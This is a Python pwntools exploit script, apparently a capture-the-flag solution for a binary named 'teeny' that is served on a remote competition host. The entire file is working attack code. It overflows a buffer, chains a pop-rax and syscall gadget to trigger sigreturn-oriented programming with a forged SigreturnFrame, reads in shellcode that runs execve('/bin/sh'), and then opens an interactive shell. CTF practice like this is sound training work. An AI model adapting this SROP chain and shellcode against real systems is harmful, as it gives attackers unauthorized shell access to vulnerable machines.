#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./teeny")


def start(argv=[], *a, **kw):
    nc = "nc cybergon2023.webhop.me 5004".split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x0
frame.rdi = 0
frame.rsi = 0x40017
frame.rdx = 0x200
frame.rsp = 0x40300  # any value
frame.rip = 0x40015

pop_rax = 0x40018
syscall = 0x40015

payload = b"A" * 8
payload += flat(pop_rax, 0xf)
payload += flat(syscall)
payload += bytes(frame)

io.send(payload)

pause(1)
io.send(b"\x90" * 0x8 + asm(shellcraft.amd64.linux.execve(b"/bin/sh")))

io.interactive()
